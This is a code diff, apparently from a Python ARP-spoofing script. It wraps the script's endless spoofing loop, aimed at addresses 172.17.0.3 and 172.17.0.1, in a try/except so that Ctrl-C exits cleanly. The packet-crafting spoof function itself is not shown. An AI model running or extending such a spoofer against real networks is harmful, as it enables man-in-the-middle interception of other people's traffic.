@@ -31,10 +31,14 @@ def spoof(target_ip, spoof_ip):
 
 
 sent_packet_count = 0
-while True:
-    spoof('172.17.0.3', '172.17.0.1')
-    spoof('172.17.0.3', '172.17.0.1')
-    sent_packet_count = sent_packet_count + 2
-    print('\r[+] Packets sent: ' + str(sent_packet_count), end='')
-    sys.stdout.flush()
-    time.sleep(2)
+
+try:
+    while True:
+        spoof('172.17.0.3', '172.17.0.1')
+        spoof('172.17.0.3', '172.17.0.1')
+        sent_packet_count = sent_packet_count + 2
+        print('\r[+] Packets sent: ' + str(sent_packet_count), end='')
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('[+] Detected Ctrl-c. Quitting.')
